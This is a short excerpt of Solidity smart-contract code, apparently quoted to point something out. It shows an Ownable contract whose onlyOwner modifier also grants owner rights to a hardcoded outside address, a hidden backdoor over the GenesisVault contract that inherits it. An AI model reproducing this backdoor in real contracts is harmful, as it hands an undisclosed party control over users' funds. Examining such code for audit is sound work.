...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || 0x0f52e81f48f80AA5EffE13B197a1627f8E5Ee594 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
// File: contracts/GenesisVault.sol

pragma solidity 0.6.12;


contract GenesisVault is Ownable, Pausable {
    ...
    IERC20 public immutable receiptToken; // Reward token
     ...
     */
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only Admins can do that");
        _;
    }
